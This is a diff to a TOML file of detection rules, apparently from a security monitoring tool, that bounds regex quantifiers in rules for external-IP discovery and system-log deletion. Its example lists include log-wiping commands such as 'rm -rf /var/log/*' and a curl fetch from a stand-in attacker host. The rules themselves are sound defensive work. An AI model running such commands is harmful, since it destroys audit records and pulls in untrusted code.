@@ -53,7 +53,7 @@ id = "discovery-external-ip"
 technique = "T1016.001"
 confidence = "high"
 description = "Checking the host's public IP or internet reachability"
-pattern = '''^(curl|wget)\s+.*(ifconfig\.(me|co)|icanhazip|ipinfo\.io|checkip|api\.ipify|ip-api\.com|ipecho|myexternalip)'''
+pattern = '''^(curl|wget)\s+.{0,300}(ifconfig\.(me|co)|icanhazip|ipinfo\.io|checkip|api\.ipify|ip-api\.com|ipecho|myexternalip)'''
 examples = ["curl ifconfig.me", "wget -qO- icanhazip.com", "curl -s https://ipinfo.io/ip"]
 not_examples = ["curl http://evil.example/a.sh"]
 
@@ -576,7 +576,7 @@ technique = "T1685.006"
 confidence = "high"
 scope = "command"
 description = "Deleting or truncating system logs"
-pattern = '''((\brm\b|\btruncate\b|\bshred\b|>)\s*[^|;&<>]*?/var/log/\S*|\b(rm|truncate|shred)\b.*\b(wtmp|btmp|lastlog|utmp)\b|\bjournalctl\s+--(vacuum|rotate)|\blogrotate\s+-f)'''
+pattern = '''((\brm\b|\btruncate\b|\bshred\b|>)\s*[^|;&<>]{0,256}?/var/log/\S*|\b(rm|truncate|shred)\b.{0,256}\b(wtmp|btmp|lastlog|utmp)\b|\bjournalctl\s+--(vacuum|rotate)|\blogrotate\s+-f)'''
 examples = ["rm -rf /var/log/*", "> /var/log/auth.log", "truncate -s 0 /var/log/syslog", "rm /var/log/wtmp", "journalctl --vacuum-time=1s"]
 not_examples = ["cat /var/log/auth.log", "tail -f /var/log/syslog"]
 
